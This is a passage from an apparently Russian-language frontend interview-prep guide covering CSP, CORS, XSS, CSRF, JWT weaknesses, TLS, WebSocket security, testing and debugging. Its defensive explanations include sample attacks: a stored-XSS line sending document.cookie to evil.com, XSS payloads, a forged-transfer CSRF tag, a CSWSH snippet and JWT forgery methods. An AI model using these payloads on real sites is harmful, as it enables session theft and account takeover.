// Сервер при каждом запросе генерирует новый случайный токен:
Content-Security-Policy: script-src 'nonce-СЛУЧАЙНЫЙ_ТОКЕН'

// И ставит его атрибутом на легитимные inline-скрипты:
<script nonce="СЛУЧАЙНЫЙ_ТОКЕН">/* легитимный код */<\/script>
\`\`\`
Атакующий не знает токен текущего запроса — его инжектированный скрипт без нужного nonce будет заблокирован.

Альтернатива — **hash**: браузер сам считает sha256 от содержимого скрипта и сравнивает:
\`\`\`
Content-Security-Policy: script-src 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeR='
\`\`\`
Подходит для статичных inline-скриптов которые не меняются — не требует серверной генерации токена.

**Report-Only** — CSP в режиме наблюдения: нарушения не блокируются, а отправляются на указанный URL. Используют чтобы протестировать политику перед включением:
\`\`\`
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
\`\`\`

**Отладка:** при нарушении CSP браузер выводит в Console точную ошибку — какой ресурс заблокирован и какой директивой. Там же видно что нужно добавить в политику.

**X-Frame-Options** — запрещает встраивать страницу в \`<iframe>\`. Защита от **clickjacking**: атакующий кладёт твой сайт в прозрачный iframe поверх своей страницы — жертва думает что кликает по чужой кнопке, а на самом деле жмёт "Подтвердить перевод" на твоём сайте.
\`\`\`
X-Frame-Options: DENY        — нельзя встроить нигде
X-Frame-Options: SAMEORIGIN  — только на своём домене
\`\`\`

**Современная альтернатива — \`frame-ancestors\` в CSP**, поддерживает несколько доменов и более гибкая:
\`\`\`
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://partner.com;
\`\`\`
Если заданы оба — \`frame-ancestors\` в CSP имеет приоритет в современных браузерах. X-Frame-Options оставляют для совместимости со старыми.`,score:3.5},{name:"CORS",level:"3",content:`**Зачем вообще существует Same-Origin Policy:**
Браузер по умолчанию запрещает JS на одном домене читать ответы с другого. Без этого любой сайт мог бы в фоне делать запросы от твоего имени — читать почту, банковский счёт, отправлять формы. CORS — механизм, позволяющий серверу явно разрешить доступ с конкретных доменов.

**Origin = протокол + домен + порт.** Разные origin:
\`\`\`
https://site.com  vs  http://site.com    // разный протокол
https://site.com  vs  https://api.com    // разный домен
https://site.com  vs  https://site.com:8080  // разный порт
\`\`\`

**Простые запросы** (GET, POST с обычными заголовками) — браузер шлёт запрос с заголовком Origin, сервер отвечает с Access-Control-Allow-Origin. Если домен не совпадает — браузер блокирует чтение ответа (запрос дошёл до сервера, браузер просто не даёт JS прочитать результат).

**Preflight (предварительный запрос)**

Браузер шлёт OPTIONS перед настоящим запросом — "можно мне сделать такой запрос?". Сервер отвечает что разрешено. Только потом идёт настоящий запрос.

Что триггерит preflight:
• Методы: PUT, DELETE, PATCH
• Кастомные заголовки: Authorization, X-Custom-Header и др.
• Нестандартный Content-Type: application/json, application/xml (всё кроме text/plain, application/x-www-form-urlencoded, multipart/form-data)

Что НЕ триггерит (простые запросы): GET, HEAD, POST с Content-Type: text/plain или application/x-www-form-urlencoded — preflight не нужен, запрос идёт сразу.
\`\`\`
// Браузер автоматически шлёт OPTIONS:
OPTIONS /api/users
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

// Сервер должен ответить:
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400  // кэшировать preflight на сутки
\`\`\`
Access-Control-Max-Age — важно для производительности: без него браузер шлёт preflight перед каждым запросом.

**CORS с credentials — куки и Authorization через домены:**
По умолчанию браузер не отправляет куки на другой домен даже если CORS разрешён. Нужно явно включить с обеих сторон:
\`\`\`js
// Клиент — явно указать credentials:
fetch('https://api.site.com/data', {
  credentials: 'include', // отправлять куки!
});

// Или axios:
axios.get('https://api.site.com/data', {
  withCredentials: true,
});
\`\`\`
\`\`\`
// Сервер ОБЯЗАН ответить двумя заголовками:
Access-Control-Allow-Origin: https://mysite.com  // НЕ может быть *!
Access-Control-Allow-Credentials: true
\`\`\`
\`Access-Control-Allow-Origin: *\` + \`credentials: include\` — браузер заблокирует запрос. Это намеренное ограничение.

**Почему * нельзя с credentials — связь с CSRF:**
Если бы \`*\` работал с credentials, любой сайт мог бы делать запросы от имени пользователя с его куками. Это открыло бы дверь для CSRF-атак в обход SameSite-защиты. Требование конкретного домена означает что сервер осознанно доверяет именно этому источнику.

**CORS — это защита браузера, не сервера.** Curl или Postman не соблюдают CORS — они просто шлют запросы. CORS защищает от атак через браузер пользователя, не от прямых запросов к API.`,score:3.5},{name:"XSS",level:"3",content:"**XSS (Cross-Site Scripting)** — атака при которой вредоносный JS выполняется в браузере жертвы в контексте доверенного сайта. Атакующий получает те же права что и сам сайт: читает куки, localStorage, делает запросы от имени пользователя, меняет DOM.\n\n**Stored XSS (хранимый)** — скрипт сохраняется в БД и показывается всем пользователям:\n```\nАтакующий пишет комментарий: <script>fetch('evil.com?c='+document.cookie)<\/script>\nСервер сохраняет это в БД.\nДругой пользователь открывает страницу → браузер выполняет скрипт → куки улетают.\n```\nСамый опасный тип — автоматически поражает всех посетителей.\n\n**Reflected XSS (отражённый)** — скрипт передаётся в URL и сервер отражает его обратно в HTML:\n```\nhttps://site.com/search?q=<script>alert(1)<\/script>\nСервер: <h1>Результаты для: <script>alert(1)<\/script></h1>\n```\nЖертву нужно заставить перейти по специально сформированной ссылке (фишинг, спам).\n\n**DOM-based XSS** — сервер не при делах, уязвимость в клиентском JS:\n```js\n// Берём значение из URL и суём в DOM без проверки:\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Привет, ' + name;\n// URL: https://site.com/page#<img src=x onerror=alert(1)>\n```\nОпасные источники: `location.hash`, `location.search`, `document.referrer`.\nОпасные получатели: `innerHTML`, `outerHTML`, `document.write`, `eval`.\n\n**Как React защищает по умолчанию:**\nJSX экранирует всё что выводится через `{}`. `<` превращается в `&lt;`, `>` в `&gt;` и т.д. — строка рендерится как текст, не как HTML:\n```jsx\nconst userInput = '<script>alert(1)<\/script>';\n<div>{userInput}</div>\n// В DOM: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div> — безопасно\n```\n\n**Где React НЕ защищает:**\n```jsx\n// dangerouslySetInnerHTML — вставляет HTML как есть:\n<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ❌\n\n// href с javascript: — выполнится при клике:\n<a href={userUrl}>link</a> // если userUrl = 'javascript:alert(1)' — ❌\n// Защита: проверять что href начинается с https://, не с javascript:\n```\n\n**Полная защита:**\n• React JSX — включена по умолчанию\n• Санитизация через DOMPurify перед dangerouslySetInnerHTML\n• CSP заголовок — запрещает inline-скрипты и внешние домены\n• HttpOnly cookies — украденные через XSS куки нельзя прочитать через JS\n• Валидация href/src атрибутов если они из пользовательских данных",score:3.5},{name:"CSRF",level:"3",content:`**CSRF (Cross-Site Request Forgery)** — атака при которой браузер жертвы отправляет запрос на доверенный сайт от её имени, без её ведома.

**Почему это работает — браузер автоматически шлёт куки:**
\`\`\`
1. Пользователь залогинен на bank.com (в браузере есть cookie с сессией)
2. Пользователь заходит на evil.com
3. evil.com содержит:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   или форму которая автоматически сабмитится через JS
4. Браузер делает запрос на bank.com — и автоматически прикрепляет cookie
5. Банк видит валидную сессию и выполняет перевод
\`\`\`
Пользователь ничего не нажимал — браузер сделал всё сам.

**Защита 1 — CSRF-токен:**
Сервер генерирует уникальный случайный токен и привязывает его к сессии. При запросе сравнивает. Атакующий не знает токен — не может сформировать валидный запрос.

Токен передаётся двумя способами:

**Способ 1 — скрытое поле в HTML-форме** (сервер рендерит форму и вставляет токен):
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123">
  ...
</form>
\`\`\`

**Способ 2 — meta-тег** (для SPA, где нет серверного рендера форм):
\`\`\`html
<meta name="csrf-token" content="abc123">
\`\`\`
JS читает токен и добавляет его в заголовок каждого запроса:
\`\`\`js
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': token },
});
\`\`\`

Почему это работает: злоумышленник с evil.com не может прочитать ни HTML страницы банка, ни её meta-теги — Same-Origin Policy запрещает. Поэтому токен остаётся секретным, и атакующий не может сформировать запрос с правильным значением.

**Защита 2 — SameSite cookie:**
Атрибут куки, указывающий браузеру когда слать куки в кросс-доменных запросах:
\`\`\`
SameSite=Strict  — куки шлются ТОЛЬКО при навигации с того же домена.
                   Даже переход по ссылке с другого сайта не пришлёт куки.
                   Ломает OAuth-редиректы — редко используют для session cookie.

SameSite=Lax     — куки шлются при навигации (ссылки, адресная строка),
                   но НЕ при автоматических запросах (img, form POST, XHR).
                   Дефолт в современных браузерах. Хороший баланс.

SameSite=None    — куки шлются всегда. Требует Secure (только HTTPS).
                   Для третьесторонних куки (трекинг, виджеты).
\`\`\`
Lax защищает от большинства CSRF-атак — форма на evil.com, сабмитящаяся в bank.com, не получит куки.

**Защита 3 — проверка Origin/Referer заголовка:**
Сервер проверяет откуда пришёл запрос. Если Origin не совпадает с доверенным доменом — отклоняет.

**Почему JWT в Authorization header защищает от CSRF:**
Браузер автоматически шлёт только куки. Authorization header атакующий из кросс-доменного запроса добавить не может — для этого нужен JS, а JS заблокирует CORS. Поэтому API с токеном в заголовке CSRF-безопасны без дополнительных мер.`,score:3.5},{name:"Безопасность JWT",level:"3",content:'**JWT (JSON Web Token)** — три части через точку: `header.payload.signature`, каждая в Base64.\n```\neyJhbGciOiJIUzI1NiJ9  ← header: { alg: "HS256" }\n.eyJ1c2VySWQiOjQyfQ    ← payload: { userId: 42, exp: 1716000000 }\n.SflKxwRJSMeKKF2QT4fw  ← подпись (HMAC SHA256 от header+payload с секретным ключом)\n```\n\n**JWT не шифрует — только подписывает.** Payload декодируется любым base64-декодером без ключа. Не класть в payload: пароли, секреты, персональные данные которые не должны видеть клиенты.\n\n**Уязвимость 1 — alg=none:**\nPayload и header JWT не зашифрованы — их можно изменить. Атакующий берёт валидный токен, меняет `role: "user"` на `role: "admin"` в payload, меняет `alg` на `none` в header, убирает подпись. Некоторые библиотеки принимали такой токен как валидный — раз алгоритм "none", проверять нечего.\n```js\n// Уязвимо — библиотека доверяет алгоритму из самого токена:\njwt.verify(token, secret);\n\n// Безопасно — явно указать какой алгоритм ожидаем:\njwt.verify(token, secret, { algorithms: [\'HS256\'] });\n```\n\n**Уязвимость 2 — algorithm confusion (RS256 → HS256):**\nRS256 — асимметричный: сервер подписывает **приватным** ключом, проверяет **публичным**. Публичный ключ открыт — его можно найти (часто отдаётся на `/.well-known/jwks.json`).\n\nАтака: взять публичный ключ сервера, поменять `alg` в header на `HS256` (симметричный), подписать изменённый payload этим публичным ключом как HMAC-секретом. Уязвимая библиотека при проверке видит `alg: HS256`, берёт тот же публичный ключ как секрет для HMAC и подпись сходится.\n```js\n// Защита — та же: явно указывать алгоритм:\njwt.verify(token, publicKey, { algorithms: [\'RS256\'] }); // HS256 будет отклонён\n```\n\n**Уязвимость 3 — слабый секрет (brute force):**\nHS256 — HMAC с секретным ключом. Подпись можно проверить офлайн без запросов к серверу. Если секрет слабый (`secret`, `password`, `123456`) — атакующий брутфорсит его по словарю и получает возможность подписывать любые токены.\n\nЗащита: секрет минимум 256 бит случайных данных (`crypto.randomBytes(32).toString(\'hex\')`), или переходить на RS256 где приватный ключ никогда не передаётся.\n\n**Уязвимость 4 — отсутствие проверки exp:**\nЕсли сервер не проверяет поле `exp` — протухший токен продолжает работать вечно. Некоторые библиотеки не проверяют по умолчанию.\n```js\njwt.verify(token, secret); // большинство библиотек проверяют exp автоматически\n// но стоит убедиться что это именно так\n```\n\n**Нельзя мгновенно инвалидировать:**\nJWT stateless — сервер не хранит список токенов. Украденный access token работает до истечения `exp`. Решения:\n• Короткий срок жизни access token (15 мин) — украденный быстро протухнет\n• Blacklist по `jti` (уникальный id токена) в Redis — нарушает stateless, но даёт мгновенную инвалидацию\n• Версия в payload + поле в БД — при логауте инкрементировать, при запросе сравнивать\n\n**Где хранить (повторение из темы Auth, ключевое):**\n```\nlocalStorage  — читается JS → украдут через XSS ❌\nCookie без httpOnly — то же самое ❌\nhttpOnly cookie — JS не читает, CSRF защищён SameSite=Lax ✅\nin-memory (переменная) — исчезает при перезагрузке, самое безопасное ✅\n```\n\n**Когда JWT лучше session:**\nМикросервисы — каждый сервис проверяет подпись локально без запроса к хранилищу сессий. Горизонтальное масштабирование — не нужен общий Redis.',score:3.5},{name:"Работа SSL/TLS",level:"4",content:`**TLS (Transport Layer Security)** — протокол шифрования соединения. SSL — его устаревший предшественник, название часто используют как синоним хотя SSL давно не применяется.

**Зачем нужен TLS:**
Без шифрования все данные передаются в открытом виде. Любой узел на пути (провайдер, роутер, публичный Wi-Fi) может прочитать или подменить их. MITM (Man-in-the-Middle, "человек посередине") — атакующий встаёт между клиентом и сервером, перехватывает и при желании изменяет трафик. Обе стороны думают что говорят напрямую.

TLS решает три задачи:
• **Шифрование** — данные нечитаемы для третьих лиц
• **Аутентификация сервера** — клиент уверен что говорит именно с bank.com, а не с подменой
• **Целостность** — данные не изменены в пути. Проверяется через MAC (Message Authentication Code) — криптографическая контрольная сумма сообщения

**TLS Handshake — как устанавливается защищённое соединение (TLS 1.3):**
\`\`\`
1. ClientHello
   Клиент → сервер: список поддерживаемых алгоритмов шифрования,
   случайное число (client random)

2. ServerHello + Certificate + Key Exchange
   Сервер → клиент: выбранный алгоритм, свой публичный ключ
   для обмена по алгоритму Диффи-Хеллмана, сертификат

3. Клиент проверяет сертификат:
   - Подпись валидна? (доверяем CA из системного хранилища)
   - Домен совпадает? Смотрим CN (Common Name — поле с доменом)
     или SAN (Subject Alternative Name — список альтернативных доменов,
     например *.example.com)
   - Не истёк? (срок действия)

4. Обмен ключами по алгоритму Диффи-Хеллмана (DH):
   Клиент и сервер каждый генерируют свою пару ключей,
   обмениваются публичными частями и независимо вычисляют
   один и тот же сессионный ключ — не передавая его по сети.
   Математика устроена так что зная только публичные части
   вычислить ключ третьей стороне практически невозможно.

5. Всё дальнейшее шифруется сессионным ключом
   алгоритмом AES (Advanced Encryption Standard) —
   симметричный блочный шифр, стандарт индустрии
\`\`\`
TLS 1.3 — 1 RTT (Round Trip Time, одно время туда-обратно) вместо 2 у TLS 1.2. Соединение устанавливается быстрее.

**Сертификаты и цепочка доверия:**
Сертификат содержит: домен, публичный ключ сервера, подпись выдавшего CA.
CA (Certificate Authority) — организация-удостоверяющий центр, чьи корневые сертификаты встроены в ОС и браузеры. Браузер им доверяет изначально.

Цепочка: Root CA (встроен в систему) → Intermediate CA (промежуточный) → Сертификат сайта. Браузер идёт по цепочке и проверяет каждую подпись.

Let's Encrypt — бесплатный CA, выдаёт сертификаты автоматически через ACME-протокол (Automated Certificate Management Environment — стандартный протокол для автоматического получения и обновления сертификатов). Certbot — популярный ACME-клиент.

**HSTS (HTTP Strict Transport Security)** — заголовок который браузер запоминает:
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`
После первого получения браузер год (31536000 секунд) будет автоматически открывать этот домен по HTTPS, игнорируя http://. Защита от SSL stripping — атаки где злоумышленник перехватывает первый HTTP-запрос до редиректа на HTTPS и держит жертву на незашифрованном соединении.`,score:3.5},{name:"Организация безопасности при реализации WebSocket-ов",level:"4",content:`**Чем WebSocket отличается от HTTP с точки зрения безопасности:**
WebSocket — persistent-соединение (постоянное, не закрывается после ответа). После установки handshake (HTTP Upgrade → WebSocket) между клиентом и сервером открыт постоянный двусторонний канал. Это меняет модель угроз: атакующий может влиять не на один запрос, а на весь поток сообщений на протяжении сессии.

**Угроза 1 — CSWSH (Cross-Site WebSocket Hijacking, межсайтовый перехват WebSocket):**
Аналог CSRF для WebSocket. WebSocket-handshake — это обычный HTTP-запрос, и браузер автоматически прикрепляет к нему куки. Атакующий с evil.com может открыть WebSocket-соединение с victim.com от имени залогиненной жертвы:
\`\`\`js
// Код на evil.com:
const ws = new WebSocket('wss://victim.com/ws');
// Браузер прикрепит куки жертвы к handshake-запросу
ws.onmessage = (e) => sendToAttacker(e.data); // читает приватные данные жертвы
\`\`\`

**Защита от CSWSH — проверка заголовка Origin при handshake:**
\`\`\`js
// Сервер при обработке WebSocket upgrade-запроса:
const origin = request.headers['origin'];
const allowedOrigins = ['https://mysite.com', 'https://app.mysite.com'];

if (!allowedOrigins.includes(origin)) {
  socket.destroy(); // отклонить соединение
  return;
}
\`\`\`
Origin — это заголовок который браузер выставляет сам и не позволяет JS его подделать. С curl или Postman можно выставить любой Origin — но это атаки не из браузера, там нет куки жертвы.

**Угроза 2 — отсутствие аутентификации:**
WebSocket сам по себе не имеет встроенной аутентификации. Проверять кто подключается нужно явно. Три подхода:
\`\`\`js
// Вариант 1 — токен в URL (не рекомендуется: токен попадает в логи сервера):
new WebSocket('wss://api.com/ws?token=eyJhbGc...');

// Вариант 2 — первым сообщением сразу после подключения:
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'auth', token: getAccessToken() }));
};
// Сервер ждёт auth-сообщение, при неверном токене — закрывает соединение
// Другие сообщения до аутентификации игнорировать!

// Вариант 3 — httpOnly cookie + проверка Origin (если сессия в куки)
// Origin защищает от CSWSH, cookie передаётся браузером автоматически
\`\`\`

**Угроза 3 — инъекции через входящие сообщения:**
Все данные от клиента — потенциально вредоносные. WebSocket не ограничивает формат сообщений — можно слать что угодно:
\`\`\`js
ws.on('message', (raw) => {
  let msg;
  try {
    msg = JSON.parse(raw);
  } catch {
    ws.close(1003, 'Invalid format'); // 1003 — unsupported data
    return;
  }

  // Проверить схему: ожидаемые поля, типы, длину строк
  if (!isValidMessage(msg)) {
    ws.close(1008, 'Policy violation');
    return;
  }

  // Дальше работать только с проверенными данными
  // Не передавать в eval, innerHTML, SQL без обработки
});
\`\`\`

**Угроза 4 — flood (флуд) / DDoS (Distributed Denial of Service — распределённая атака отказа в обслуживании):**
Один клиент может отправлять тысячи сообщений в секунду, перегружая сервер. Rate limiting (ограничение частоты) на уровне соединения:
\`\`\`js
// Простой rate limiter: не более 10 сообщений в секунду
const msgCount = new Map(); // connectionId → count

ws.on('message', (data) => {
  const count = (msgCount.get(ws.id) ?? 0) + 1;
  msgCount.set(ws.id, count);
  if (count > 10) {
    ws.close(1008, 'Rate limit exceeded');
    return;
  }
  // Сбрасывать счётчик каждую секунду
});
\`\`\`

**WSS (WebSocket Secure)** — WebSocket поверх TLS (аналог HTTPS для WebSocket). Всегда использовать в продакшне: шифрует весь канал, защищает от перехвата и подмены сообщений в пути. \`ws://\` — открытый текст, \`wss://\` — зашифровано.`,score:3.5}]},{id:"testing",title:"ТЕСТИРОВАНИЕ",icon:"🧪",color:"#26A69A",topics:[{name:"Паттерн AAA (Arrange Act Assert)",level:"2",content:`\`\`\`js
// Arrange — подготовка
const calculator = new Calculator();

// Act — действие
const result = calculator.add(2, 3);

// Assert — проверка
expect(result).toBe(5);
\`\`\`

Каждый тест — одно действие, одна проверка. Чистый и читаемый.`},{name:"Моки. Зачем нужны и как применять",level:"3",content:`**Mock** — подделка зависимости с контролируемым поведением.

\`\`\`js
const mockFetch = jest.fn().mockResolvedValue({ json: () => ({ name: 'Alice' }) });
global.fetch = mockFetch;

await loadUser();

expect(mockFetch).toHaveBeenCalledWith('/api/user');
\`\`\`

Зачем: изоляция тестируемого кода, предсказуемость, скорость (не ждём реальный API).`},{name:"Stub, Spy. Зачем нужны и как применять",level:"3",content:`**Stub** — заглушка, возвращающая фиксированное значение. Не проверяем вызов.
\`\`\`js
const getUser = jest.fn().mockReturnValue({ name: 'Alice' });
\`\`\`

**Spy** — наблюдатель, следит за вызовами реального метода без подмены:
\`\`\`js
const spy = jest.spyOn(console, 'log');
doSomething();
expect(spy).toHaveBeenCalledWith('done');
spy.mockRestore();
\`\`\`

**Mock** = Stub + Spy (подменяет и отслеживает).`},{name:"Принцип TDD",level:"3",content:`**TDD (Test-Driven Development):**
1. **Red** — пишем тест → он падает (функционал не реализован)
2. **Green** — пишем минимальный код, чтобы тест прошёл
3. **Refactor** — улучшаем код, тесты продолжают проходить

Преимущества: лучший дизайн кода, высокое покрытие, документация через тесты, уверенность при рефакторинге.`},{name:"Интеграционные и e2e тесты (cypress / playwright)",level:"3",content:`**Unit** — одна функция/компонент в изоляции.
**Интеграционные** — несколько модулей вместе (компонент + API, несколько компонентов).
**E2E** — полный пользовательский сценарий в реальном браузере от начала до конца.

**Cypress:**
Тест живёт внутри браузера — прямой доступ к DOM без WebDriver. Только JS/TS.
• **Auto-retry** — каждая команда ждёт элемент до 4 сек, не нужен sleep/waitFor
• **Time-travel debugging** — в Cypress UI каждый шаг сохраняет снимок DOM, можно пройтись по шагам и увидеть состояние страницы в любой момент
• **cy.intercept()** — перехват и мок сетевых запросов
• **cy.session()** — кешировать состояние авторизации между тестами (не логиниться заново каждый тест)
• **Кастомные команды** — \`Cypress.Commands.add('login', ...)\` для переиспользования действий
• Ограничения: только Chromium + Firefox (слабо), нет нативно нескольких вкладок, один origin за раз

**Playwright:**
От Microsoft. Процесс теста вне браузера, управляет через CDP. TS/JS/Python/Java/C#.
• **Кросс-браузерность** — Chromium, Firefox, WebKit (Safari-движок) из коробки
• **Auto-wait** — аналогично Cypress, ждёт видимость и стабильность элемента
• **Параллельность из коробки** — несколько workers без настройки, быстрее на CI
• **Несколько вкладок и cross-origin** — нативная поддержка
• **Мобильная эмуляция** — \`devices['iPhone 13']\` с точными метриками
• **Trace Viewer** — полная запись теста: DOM, сеть, консоль, таймлайн (\`npx playwright show-trace\`)
• **Codegen** — \`npx playwright codegen url\` генерирует тест записью действий в браузере
• **Fixtures** — изолированное переиспользуемое состояние для тестов (логин один раз → передать в тест)

**Когда что выбрать:**
\`\`\`
Cypress:    быстрый старт, отличный DX, удобная отладка через UI
Playwright: нужна кросс-браузерность, скорость на CI, несколько вкладок,
            мобильная эмуляция или сложные multi-origin сценарии
\`\`\`
Оба используют \`data-testid\` как рекомендуемый селектор — не зависит от CSS и текста.`},{name:"Пирамида тестирования, инструменты для каждого уровня",level:"3",content:`\`\`\`
       /  E2E  \\       — мало, медленные, дорогие
      / Integration \\   — средне
     /    Unit       \\  — много, быстрые, дешёвые
\`\`\`

**Unit:** Jest, Vitest, React Testing Library
**Integration:** Jest + MSW (Mock Service Worker), Supertest
**E2E:** Cypress, Playwright

**Перевёрнутая пирамида** — антипаттерн: много E2E, мало Unit. Медленные, хрупкие тесты.`},{name:"Coverage. Инструменты и принцип работы",level:"4",content:`**Coverage** — процент кода, выполненного при прогоне тестов.

**Метрики:**
• **Statements** — % выполненных выражений
• **Branches** — % пройденных ветвлений (if/else, switch)
• **Functions** — % вызванных функций
• **Lines** — % выполненных строк

**Инструменты:** istanbul/nyc, Jest --coverage, Vitest --coverage, c8.

**Важно:** 100% coverage ≠ качественные тесты. Можно покрыть всё без проверки правильности. Coverage — метрика полноты, не качества.

**Три реальных проблемы с целью "100% coverage":**

**1. Бесполезные тесты ради метрики**
Разработчики пишут тесты без assertions — только чтобы прогнать код и поднять цифру:
\`\`\`js
it('runs without errors', () => {
  formatDate(new Date()); // нет expect() — баг пройдёт незамеченным
});
\`\`\`

**2. Некоторый код не стоит тестировать**
Конфиги, сгенерированный код, тривиальные геттеры — покрывать их тестами пустая трата времени. Цель 100% заставляет писать тесты там, где от них нет пользы:
\`\`\`js
class Config {
  getTimeout() { return 5000; } // тест на этот геттер ничего не доказывает
}
\`\`\`

**3. Ложное чувство безопасности**
100% coverage не гарантирует корректность. Тесты могут не проверять граничные случаи:
\`\`\`js
function divide(a, b) { return a / b; }

it('divides numbers', () => {
  expect(divide(10, 2)).toBe(5); // coverage 100%
  // но divide(10, 0) → Infinity не проверяется
  // divide('10', 2) → 5 (неявное приведение) не проверяется
});
\`\`\`

Практика: целевой порог 80–90% на критических модулях. Не гонятся за 100% — фокус на тестировании граничных случаев и бизнес-логики.`},{name:"Unit тестирование",level:"2",content:`Тестирование отдельной функции/компонента в изоляции.

**React Testing Library:**
\`\`\`js
render(<Button label="Click" onClick={mockFn} />);
const btn = screen.getByText('Click');
fireEvent.click(btn);
expect(mockFn).toHaveBeenCalled();
\`\`\`

Принцип: тестируй поведение, не реализацию. Query по тексту/роли, не по className.`}]},{id:"exceptions",title:"ОБРАБОТКА ИСКЛЮЧЕНИЙ, ЛОГИРОВАНИЕ, ДЕБАГ",icon:"🐛",color:"#FF7043",topics:[{name:"try-catch",level:"2",content:`\`\`\`js
async function getData() {
  try {
    const res = await fetch('/api');
    if (!res.ok) throw new NetworkError(res.status);
    return await res.json();
  } catch (err) {
    if (err instanceof NetworkError) showNetworkError(err.status);
    else throw err; // незнакомые ошибки всегда пробрасывай — не глотай молча!
  } finally {
    setLoading(false); // выполнится всегда — даже если в try есть return
  }
}
\`\`\`

**Объект ошибки:**
\`\`\`js
err.name      // 'TypeError', 'NetworkError' и т.д.
err.message   // текст ошибки
err.stack     // стектрейс с файлами и строками
\`\`\`
Встроенные типы: **Error** (базовый), **TypeError** (неправильный тип), **ReferenceError** (переменная не найдена), **SyntaxError** (синтаксис), **RangeError** (значение вне диапазона).

**try-catch ловит только синхронные ошибки:**
\`\`\`js
try {
  setTimeout(() => { throw new Error('!'); }, 100); // ❌ не поймает
  fetch('/api').then(r => r.json());                // ❌ не поймает
} catch (e) { }

// ✅ С await — работает:
try {
  const res = await fetch('/api');   // await "раскрывает" rejected Promise
  if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
  return await res.json();
} catch (e) { /* поймает сетевую ошибку и throw выше */ }
\`\`\`

**Custom Error — разделение типов в catch:**
\`\`\`js
class NetworkError extends Error {
  constructor(status) {
    super(\`HTTP \${status}\`);
    this.name = 'NetworkError';
    this.status = status;
  }
}
class ValidationError extends Error {
  constructor(fields) {
    super('Validation failed');
    this.name = 'ValidationError';
    this.fields = fields;
  }
}
\`\`\`

**Глобальная обработка ошибок:**
\`\`\`js
// Синхронные ошибки (скрипты, не React):
window.addEventListener('error', (event) => {
  sendToSentry(event.error);
});

// Необработанные промисы (забыли .catch() или await):
window.addEventListener('unhandledrejection', (event) => {
  sendToSentry(event.reason);
  event.preventDefault(); // не показывать ошибку в консоли
});
\`\`\`

**ErrorBoundary** — ловит ошибки рендера в React (только class-компоненты):
\`\`\`jsx
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  static getDerivedStateFromError() { return { hasError: true }; }
  componentDidCatch(error, info) { sendToSentry(error, info); }
  render() {
    return this.state.hasError ? <FallbackUI /> : this.props.children;
  }
}
\`\`\`
ErrorBoundary **не ловит:** обработчики событий (onClick), setTimeout/fetch, SSR, ошибки внутри самого ErrorBoundary.
Нужны оба механизма: ErrorBoundary → ошибки рендера, window handlers → всё остальное.`},{name:"Способы дебага клиентского кода",level:"2",content:`**console-методы:**
\`\`\`js
console.log('лог');
console.warn('предупреждение');
console.error('ошибка');
console.dir(element);           // DOM-элемент как объект со свойствами
console.table(arrayOfObjects);  // данные таблицей — удобно для массивов
console.group('Запрос');        // группировка вывода
console.log('url:', url);
console.groupEnd();
console.time('fetch');          // начать замер
console.timeEnd('fetch');       // fetch: 234ms
console.count('клик');          // счётчик вызовов
console.trace();                // стектрейс в текущем месте
\`\`\`

**debugger** — браузер остановится на этой строке:
\`\`\`js
function calculate(x) {
  debugger; // ⚠️ удаляй перед коммитом!
  return x * 2;
}
\`\`\`

**Breakpoints в DevTools:**
• **Line breakpoint** — клик на номер строки в Sources
• **Conditional breakpoint** — останавливает только при выполнении условия
• **DOM breakpoint** — при изменении DOM-узла (subtree, attribute, removal)
• **XHR/Fetch breakpoint** — при запросе на URL по паттерну
• **Event listener breakpoint** — при срабатывании любого события (click, keydown...)
• **Exception breakpoint** — при любой ошибке (caught или uncaught)

**Source Maps** — связывают минифицированный код с оригинальным:
\`\`\`
Без source map:  TypeError at a:1:23456
С source map:    TypeError at calculateUserAge src/utils.ts:14:5
\`\`\`
\`\`\`js
// webpack: module.exports = { devtool: 'source-map' }
// vite:    export default { build: { sourcemap: true } }
\`\`\`
⚠️ Не отдавай source maps публично в продакшне — раскрывают исходный код. Загружай только в Sentry.

**Network tab** — запросы, статусы, заголовки, тело ответа.
**Performance tab** — flame chart, что блокирует main thread.
**React DevTools** — дерево компонентов, props, state, profiler (перерендеры).`},{name:"redux/react/альтернативы devtools",level:"3",content:`**React DevTools:** дерево компонентов, props, state, hooks, profiler (перерендеры), highlight updates.

**Redux DevTools:** time-travel debugging, просмотр всех actions и state diff, импорт/экспорт состояния.

**Vue DevTools, MobX DevTools, Zustand DevTools** — аналогичные инструменты для своих экосистем.`},{name:"Настройка логирования ошибок (sentry, prometheus и др.)",level:"4",content:`**Sentry** — сервис мониторинга ошибок и производительности. Перехватывает ошибки в продакшне и отправляет детальные отчёты.

**Стектрейс** — цепочка вызовов функций, которая привела к ошибке. Читается снизу вверх: нижний фрейм — место где упало, выше — все вызовы которые к нему привели:
\`\`\`
Error: Cannot read properties of undefined
  at getUserName  (user.js:12)      ← здесь упало
  at renderProfile (profile.js:34)  ← вызвал getUserName
  at App.render    (App.js:8)       ← вызвал renderProfile
\`\`\`
В браузере без source maps стектрейс указывает на минифицированный бандл — имена вида \`a\`, \`t\`, строка 1 колонка 84732. Sentry использует source maps и показывает оригинальный TS/JSX с нормальными именами и номерами строк.

**Что Sentry даёт из коробки:**

**1. Source maps** — разворачивает минифицированный стектрейс в читаемый оригинальный код. Самому реализовать: загружать карты на сервер, хранить их, разворачивать при каждой ошибке.

